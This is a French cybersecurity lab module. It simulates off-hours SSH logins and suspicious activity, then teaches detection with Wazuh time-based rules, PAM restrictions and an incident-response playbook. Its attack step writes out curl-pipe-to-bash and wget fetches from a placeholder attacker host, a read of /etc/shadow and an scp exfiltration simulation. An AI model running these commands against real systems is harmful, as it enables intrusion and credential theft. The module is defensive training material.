# Attaque 5 : Connexion hors horaires + Comportement anormal

**Durée estimée :** 45 minutes  
**Niveau :** Basique/Intermédiaire  
**Objectif :** Détecter les connexions en dehors des heures de travail normales (signe d'une possible compromission)

---

## 📋 Objectifs pédagogiques

À l'issue de cette attaque, vous comprendrez :

- Comment identifier les connexions anormales
- L'importance de la baseline comportementale
- Comment les IDS détectent les anomalies temporelles
- L'utilité des règles basées sur le temps
- Comment réagir aux anomalies de connexion
- La corrélation d'événements pour la détection avancée

---

## 🎯 Scénario réaliste

Un utilisateur compromis est utilisé par l'attaquant pour :
- Se connecter à des heures inhabituelles
- Accéder à des ressources sensibles
- Effectuer des actions suspectes

Ces comportements anormaux sont des **indicateurs d'une compromission** (Indicators of Compromise - IoC).

---

## 🛠️ Prérequis

**Sur la machine attaquante :**
- Accès SSH ou RDP
- Horloge synchronisée (ntpd/chrony)
- Outil de scheduled tasks (cron, at, systemd-timer)

**Sur la VM cible :**
- SSH actif
- Logs de connexion enregistrés
- Wazuh agent actif
- Horaires de travail définis dans la config

**Configuration attendue :**
```
Horaires de travail : 08h00 - 18h00 (du lundi au vendredi)
Utilisateurs autorisés : student, admin
Accès anormal : après 21h00, le weekend, avant 06h00
```

---

## ⚙️ Étape 1 : Établir une baseline comportementale (10 min)

### Objectif
Définir quels sont les horaires NORMAUX de connexion.

### Analyser les logs actuels

```bash
# Voir toutes les connexions SSH
sudo lastlog | head -20

# Ou voir l'historique détaillé
sudo grep "Accepted password" /var/log/secure | tail -50

# Afficher uniquement les heures
sudo grep "Accepted password" /var/log/secure | awk '{print $1, $2, $3}'
```

### Output attendu (comportement normal)

```
Jan 15 08:30:20 web sshd[5234]: Accepted password for student from 192.168.1.50 port 54321 ssh2
Jan 15 09:15:45 web sshd[5235]: Accepted password for admin from 192.168.1.51 port 54322 ssh2
Jan 15 10:42:30 web sshd[5236]: Accepted password for student from 192.168.1.50 port 54323 ssh2
Jan 15 14:20:15 web sshd[5237]: Accepted password for admin from 192.168.1.51 port 54324 ssh2
Jan 15 17:45:50 web sshd[5238]: Accepted password for student from 192.168.1.50 port 54325 ssh2

=== PATTERN ===
Horaires : 8h00 - 18h00
Utilisateurs : student, admin
Fréquence : ~5-10 connexions/jour
```

### Créer un profil de base

```bash
# Extraire les horaires de connexion
cat > /tmp/baseline.sh << 'EOF'
#!/bin/bash

echo "=== SSH Connection Baseline ==="
echo "Analyzing SSH logs for normal patterns..."

# Extraire l'heure de connexion
sudo grep "Accepted password" /var/log/secure | awk '{print $3}' | \
  awk -F: '{print $1}' | sort | uniq -c

# Résultat attendu :
#  5 08
#  3 09
#  4 10
#  3 11
#  2 12
#  0 13
#  2 14
#  1 15
#  4 16
#  2 17
#  0 18
#  0 19
#  0 20
#  0 21

echo -e "\nBaseline hours: 08:00 - 17:00"
echo "Expected pattern: Most connections during work hours"
EOF

chmod +x /tmp/baseline.sh
/tmp/baseline.sh
```

---

## ⚙️ Étape 2 : Connexion hors horaires (20 min)

### Objectif
Effectuer des connexions SSH en dehors des heures de travail pour tester la détection.

### Simulation 1 : Connexion tard le soir (22h00)

```bash
# Option 1: Attendre vraiment jusqu'à 22h00 (long, pas pédagogique)
# sleep 86400  # Attendre 24h

# Option 2: Simuler une connexion tardive
# Utiliser SSH avec un timestamp falsifié
# (Plus réaliste: attaquant use une machine avec l'heure modifiée)

# Envoyer la connexion
ssh -p 22 student@192.168.1.100 "whoami; date"

# Output attendu :
# student
# Mon Jan 15 22:35:20 CET 2024  <- Timestamp enregistré dans les logs
```

### Simulation 2 : Utiliser at/cron pour scheduler

```bash
# Créer une connexion automatique pour 22h00
cat > /tmp/late_login.sh << 'EOF'
#!/bin/bash
ssh student@192.168.1.100 "echo 'Unauthorized access' > /tmp/suspicious.log"
EOF

chmod +x /tmp/late_login.sh

# Scheduler via at (one-time)
echo "/tmp/late_login.sh" | at 22:00

# Ou via cron (répétée)
echo "30 22 * * * /tmp/late_login.sh" | crontab -

# Voir les jobs schedulés
at -l
crontab -l
```

### Simulation 3 : Connexion le weekend

```bash
# Vérifier le jour actuel
date

# Si c'est la semaine, utiliser at pour simuler weekend
# Format: at 22:00 Sunday
echo "ssh student@192.168.1.100 'whoami'" | at 22:00 Sunday

# Vérifier
atq
```

### Simulation 4 : Connexions multiples rapides

```bash
# Effectuer plusieurs connexions en peu de temps (anormal)
for i in {1..10}; do
  ssh student@192.168.1.100 "id" 2>/dev/null &
  sleep 1
done

# Output attendu dans les logs :
# Jan 15 22:35:20 Accepted password ... (connexion 1)
# Jan 15 22:35:21 Accepted password ... (connexion 2)
# Jan 15 22:35:22 Accepted password ... (connexion 3)
# ...
# Modèle = suspicieux! Pas de human behavior
```

---

## ⚙️ Étape 3 : Autres comportements anormaux (10 min)

### Objectif
Générer des événements suspects supplémentaires pour tester la corrélation.

### Événement 1 : Accès à fichiers sensibles

```bash
# Connexion hors horaires + accès /etc/shadow
ssh student@192.168.1.100 << 'EOF'
cat /etc/shadow
sudo find / -perm -4000
ls -la /root
EOF

# Logs attendus :
# Jan 15 22:35:20 sshd: Accepted password
# Jan 15 22:35:21 sudo: student ... COMMAND=/usr/bin/find
# Jan 15 22:35:22 auditd: Access to /root denied
```

### Événement 2 : Téléchargement de fichiers suspects

```bash
# Télécharger un outil d'énumération
ssh student@192.168.1.100 << 'EOF'
wget http://attacker.com/linpeas.sh
curl http://attacker.com/enum.sh | bash
EOF

# Ou créer localement
ssh student@192.168.1.100 << 'EOF'
cat > /tmp/malware.sh << 'SCRIPT'
#!/bin/bash
# Énumération du système
whoami
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
SCRIPT

chmod +x /tmp/malware.sh
/tmp/malware.sh
EOF
```

### Événement 3 : Transfert de fichiers volumineux

```bash
# Créer un grand fichier de données
ssh student@192.168.1.100 << 'EOF'
# Simuler l'exfiltration de données sensibles
dd if=/dev/zero of=/tmp/data.bin bs=1M count=100
scp /tmp/data.bin attacker@192.168.1.50:/tmp/
EOF

# Logs attendus :
# Jan 15 22:36:00 sshd: data transfer initiated
# Jan 15 22:36:30 sshd: 104857600 bytes transferred
```

---

## 🔍 Rôle 1 : Administrateur système & hardening

### Ce que tu dois vérifier

#### 1. Vérifier les logs de connexion

```bash
# Voir tous les accès
sudo lastlog

# Voir les dernières connexions
sudo last | head -20

# Afficher l'heure de chaque connexion
sudo lastlog -t 1  # Dernière 1 jour

# Output :
# student    pts/0                    Mon Jan 15 22:35:20 +0100 2024
# admin      pts/1                    Mon Jan 15 22:30:45 +0100 2024
# student    pts/2                    Mon Jan 15 22:28:10 +0100 2024
```

#### 2. Configurer un système d'alerte basé sur les heures

```bash
# Créer une config de travail pour rsyslog
cat > /tmp/work_hours.conf << 'EOF'
# Log entries outside work hours
$ModLoad imfile
$InputFileName /var/log/secure
$InputTag sshd:
$InputRead Imfile

# Si l'heure est hors 8-18, envoyer une alerte
$ActionExecOnlyWhenPreviousIsSuspended on
$ActionExecOnlyWhieverPreviousSuspension off
$RuleSet urgent

:programname, isequal, "sshd" /var/log/ssh_outside_hours.log

:programname, isequal, "sshd" @@logserver.example.com:514
EOF

# Appliquer
sudo cp /tmp/work_hours.conf /etc/rsyslog.d/
sudo systemctl restart rsyslog
```

#### 3. Implémenter une politique de connexion

```bash
# PAM configuration pour restreindre les accès
cat > /etc/security/time.conf << 'EOF'
# Format: services ; ttys ; users ; times
sshd;*;*;Al0800-1800
sshd;*;admin;Al0000-2359  # Admin peut anytime
sshd;*;root;!Al0000-2359  # Root jamais
EOF

# Mettre à jour PAM
sudo sed -i '/^account/a account     required      pam_time.so' /etc/pam.d/sshd
sudo systemctl restart sshd
```

---

## 🛡️ Rôle 2 : SOC / Logs / Détection

### Logs SSH à analyser

#### Connexions normales vs anormales

```
=== NORMAL (8h-18h, lundi-vendredi) ===
Jan 15 09:30:00 web sshd[5234]: Accepted password for student from 192.168.1.50

=== ANORMAL (22h00) ===
Jan 15 22:35:00 web sshd[5244]: Accepted password for student from 192.168.1.50

=== TRÈS ANORMAL (actions sensibles + late hour) ===
Jan 15 22:35:20 web sshd[5244]: Accepted password for student
Jan 15 22:35:21 web sudo: student ... COMMAND=/bin/cat /etc/shadow
Jan 15 22:35:25 web sshd[5245]: Received disconnect from 192.168.1.50
```

### Règles Wazuh basées sur le temps

**Ajouter au fichier :** `/var/ossec/etc/rules/time_based_detection.xml`

```xml
<group name="time_based,behavioral,">
  <!-- SSH connexion hors horaires -->
  <rule id="100600" level="6">
    <if_sid>5720,5721</if_sid>
    <time>!Al0800-1800</time>  <!-- NOT between 8:00 and 18:00 -->
    <description>SSH login outside work hours</description>
    <group>time_based,unusual_activity</group>
  </rule>

  <!-- SSH connexion hors horaires + samedi/dimanche -->
  <rule id="100601" level="7">
    <if_sid>5720,5721</if_sid>
    <time>!A!W62</time>  <!-- NOT Monday-Friday, 6 and 2 = SAT and SUN -->
    <description>SSH login outside work hours AND weekend</description>
    <group>time_based,unusual_activity,weekend</group>
  </rule>

  <!-- SSH connexion tard le soir (22h-06h) -->
  <rule id="100602" level="5">
    <if_sid>5720,5721</if_sid>
    <time>A2200-0600 | A2100-0700</time>
    <description>SSH login during night hours (22:00-06:00)</description>
    <group>time_based,night_activity</group>
  </rule>

  <!-- Multiple connexions en peu de temps -->
  <rule id="100603" level="7">
    <if_sid>100600</if_sid>
    <frequency>5</frequency>
    <timeframe>300</timeframe>  <!-- 5 minutes -->
    <description>Multiple SSH logins in short time (possible compromise)</description>
    <group>time_based,brute_force</group>
  </rule>

  <!-- Connexion hors horaires + actions sensibles -->
  <rule id="100604" level="9">
    <if_sid>100600,100602</if_sid>
    <regex>COMMAND=/bin/cat.*shadow|COMMAND=/usr/bin/find.*suid|COMMAND=/bin/chmod</regex>
    <description>Off-hours login with suspicious commands (CRITICAL)</description>
    <group>time_based,privilege_escalation,anomalous_behavior</group>
  </rule>

  <!-- Connexion depuis adresse inhabituelle -->
  <rule id="100605" level="7">
    <if_sid>5720,5721</if_sid>
    <regex>from 192.168.2|from 10.0.0</regex>  <!-- Adapt to your network -->
    <description>SSH login from unusual source IP</description>
    <group>lateral_movement,unusual_activity</group>
  </rule>
</group>
```

### Dashboard Wazuh - Anomalies détectées

```
ANOMALOUS BEHAVIOR DETECTED

Severity: HIGH 🟠
Event: SSH Login Outside Work Hours + Suspicious Commands

Source: 192.168.1.50
Target User: student (UID 1000)
Timestamp: 2024-01-15 22:35:20

Triggered Rules:
✓ Rule 100600 - SSH login outside work hours (Level 6)
✓ Rule 100602 - SSH login during night hours (Level 5)
✓ Rule 100604 - Off-hours login with suspicious commands (Level 9)
✓ Rule 100603 - Multiple logins in short time (Level 7)

Attack Timeline:
22:35:20 - Student SSH login (OUTSIDE HOURS)
22:35:21 - Sudo cat /etc/shadow attempted
22:35:22 - Find SUID binaries command
22:35:23 - Chmod 4755 attempted
22:35:24 - Login #2 from same IP
22:35:25 - System enumeration detected

Behavioral Anomalies:
⚠ Multiple logins (5 in 5 min) - NOT human behavior
⚠ Accessing sensitive files at night
⚠ Attempting privilege escalation
⚠ Automated-looking commands (suspicious timing)

Status: UNDER INVESTIGATION
```

---

## 📊 Rôle 3 : Supervision & Incident Response

### Anomalies à surveiller

#### Zabbix/Grafana Metrics

```
SSH Logins Outside Work Hours:
Value: 3 logins in last 30 min
Threshold: Normal = 0
Status: CRITICAL ⚠️

SSH Logins by Hour (24h):
08:00-18:00: 45 logins (NORMAL)
18:00-22:00: 5 logins (MINOR ALERT)
22:00-06:00: 8 logins (CRITICAL) ← Unusual!
06:00-08:00: 2 logins (NORMAL for early starters)

Unique Source IPs (last 24h):
192.168.1.50: 23 logins (MAIN USER - NORMAL)
192.168.1.60: 15 logins (NORMAL USER)
192.168.1.70: 2 logins (UNUSUAL - 22:35, 22:37) ← ANOMALY!

Failed Login Attempts:
Value: 12 in last 60 min
Threshold: Warning > 5
Status: WARNING

SSH Session Duration:
Value: 4.2 seconds (avg last logins)
Threshold: Normal > 120 seconds
Status: ANOMALOUS (quick sessions = possible automation)
```

### Playbook d'incident response

#### Étape 1 : Vérification immédiate

```bash
# 1. Confirmer la connexion anormale
sudo grep "22:35" /var/log/secure | grep -i accepted

# Output :
# Jan 15 22:35:20 web sshd[5244]: Accepted password for student from 192.168.1.50 port 54399 ssh2

# 2. Voir toutes les actions de cet utilisateur à cette heure
sudo grep "^Jan 15 22:" /var/log/secure

# 3. Vérifier si c'est hors horaires normaux
date  # Affiche l'heure actuelle du serveur

# 4. Confirmer l'adresse IP source
sudo netstat -tlnp | grep 22

# 5. Vérifier les processus actifs du user
ps aux | grep student

# 6. Voir les fichiers modifiés récemment
find /home/student -type f -mtime -1
find /tmp -type f -mtime -1
```

#### Étape 2 : Containment (confinement)

```bash
# 1. Tuer la session SSH de l'utilisateur
sudo pkill -u student

# 2. Temporairement restreindre son accès
sudo usermod -s /sbin/nologin student

# 3. Vérifier que les sessions sont bien terminées
ps aux | grep student
sudo lastlog | head -5

# 4. Sauvegarder les preuves
sudo tar -czf /tmp/evidence_anomaly_$(date +%s).tar.gz \
  /var/log/secure \
  /var/log/audit/audit.log \
  /home/student/.ssh/ \
  /home/student/.bash_history

# 5. Notifier l'équipe
echo "[ALERT] Anomalous activity detected for user: student" | \
  mail -s "SECURITY INCIDENT" security@company.com
```

#### Étape 3 : Investigation détaillée

```bash
# Générer un rapport complet
cat > /tmp/time_anomaly_incident.md << 'EOF'
# Incident Report: Off-Hours Login with Suspicious Behavior

## Executive Summary
User "student" accessed system outside normal work hours and performed multiple suspicious actions suggesting compromise or unauthorized access.

## Incident Details
- **Date/Time:** Jan 15, 2024 at 22:35 (Outside work hours: 08:00-18:00)
- **User:** student (UID 1000)
- **Source IP:** 192.168.1.50
- **Duration:** 4.2 seconds (automated behavior, not human)
- **Commands:** cat /etc/shadow, find SUID, chmod 4755

## Timeline
22:35:20 - SSH login accepted (OUTSIDE HOURS)
22:35:21 - Sudo cat /etc/shadow
22:35:22 - Find command for SUID binaries
22:35:23 - Chmod 4755 /tmp/shell
22:35:24 - Second SSH login from same IP
22:35:45 - Disconnect

## Behavioral Analysis
1. **Temporal Anomaly:** Login at 22:35 (outside 08:00-18:00)
2. **Rapid Actions:** 5 commands in 25 seconds (not human)
3. **Privilege Escalation Intent:** Attempted sudo commands
4. **System Enumeration:** Searching for SUID binaries
5. **Shell Creation:** Chmod suggesting shell/backdoor installation

## Detection Methods
- Wazuh Rule 100604 (off-hours + suspicious commands)
- Behavioral baseline anomaly detection
- Time-based correlation
- Command pattern recognition

## Response Actions
1. ✅ Killed SSH sessions
2. ✅ Disabled user account
3. ✅ Preserved evidence
4. ✅ Incident logged and alerted
5. ✅ Investigation ongoing

## Root Cause Analysis
- Possible account compromise
- Possible stolen credentials
- Possible social engineering

## Recommendations
1. Force password reset for "student" account
2. Review SSH key authentication
3. Implement network segmentation
4. Enable MFA for remote access
5. Review account access history
6. Check for other compromised accounts

## Status: UNDER INVESTIGATION
EOF

cat /tmp/time_anomaly_incident.md
```

#### Étape 4 : Investigation continue

```bash
# Vérifier si autres utilisateurs ont aussi des anomalies
sudo lastlog | grep -E "22:|23:|00:|01:|02:|03:|04:|05:|06:"

# Vérifier l'historique SSH
sudo lastb  # Failed login attempts
sudo lastlog -f /var/log/btmp

# Analyser les clés SSH de l'utilisateur
cat ~/.ssh/authorized_keys
ssh-keygen -l -f ~/.ssh/id_rsa.pub

# Vérifier les fichiers modifiés
sudo auditctl -l  # Liste des règles d'audit
sudo ausearch -f /home/student

# Vérifier les connexions réseau
sudo netstat -an | grep ESTABLISHED
sudo ss -tan | grep ESTABLISHED
```

---

## ✅ Checklist de validation

### Point 1 : Attaque exécutée
- [ ] Connexion SSH réussie en dehors des heures de travail
- [ ] Au moins 3 actions suspectes effectuées
- [ ] Logs enregistrent correctement l'heure et les commandes

### Point 2 : Détection confirmée
- [ ] Alerte Wazuh generée (rule level 7-9)
- [ ] Règles time-based déclenchées
- [ ] Dashboard affiche l'anomalie
- [ ] Corrélation d'événements détectée

### Point 3 : Réaction confirmée
- [ ] Session SSH interrompue
- [ ] Compte limité/désactivé temporairement
- [ ] Incident documenté et rapporté
- [ ] Investigation en cours

---

## 📝 Commandes utiles - Mémo rapide

```bash
# Vérifier les connexions récentes
sudo lastlog
sudo last | head -20
sudo lastb

# Voir les logs SSH
sudo grep "Accepted password" /var/log/secure
sudo grep -E "22:|23:" /var/log/secure

# Analyser les horaires
sudo grep "Accepted" /var/log/secure | awk '{print $3}' | sort | uniq -c

# Tuer une session utilisateur
sudo pkill -u username
sudo killall -u username

# Désactiver un compte
sudo usermod -s /sbin/nologin username

# Vérifier les clés SSH
cat ~/.ssh/authorized_keys
ssh-keygen -l -f ~/.ssh/id_rsa

# Wazuh queries
sudo grep "rule.*100600\|100604" /var/ossec/logs/alerts.log
```

---

## 🔗 Références internes

- [04_elevation_privileges.md](./04_elevation_privileges.md) → Attaque précédente
- [README.md](../README.md) → Retour au projet
- [01_nmap.md](./01_nmap.md) → Première attaque (pour le cycle complet)

---

## 💡 Points clés à retenir

1. **La baseline est essentielle** → Impossible de détecter l'anormal sans connaître le normal
2. **Les anomalies temporelles = alerte** → Login à 22h35 hors horaires = suspect
3. **Corrélez les événements** → Off-hours + privilege escalation = CRITIQUE
4. **Réagissez rapidement** → Isolation immédiate du compte
5. **Documentez tout** → Les preuves servent pour l'investigation et l'escalade
6. **L'automation se voit** → Séquences trop rapides = commandes générées, pas humaines

---

## 🎬 Résumé : Cycle d'attaque complet

```
01. NMAP              → Reconnaissance (port scan)
    ↓
02. BRUTE FORCE SSH   → Authentification (accès)
    ↓
03. UPLOAD WEB SHELL  → Exécution de code (RCE)
    ↓
04. ESCALADE PRIVS    → Privilèges (root access)
    ↓
05. CONNEXION ANORMALE → Utilisation persistante (C&C)

À chaque étape :
✓ L'attaquant progresse
✓ Wazuh détecte + alerte
✓ SELinux / Fail2ban bloque (si configuré)
✓ Rôle 3 réagit automatiquement
```

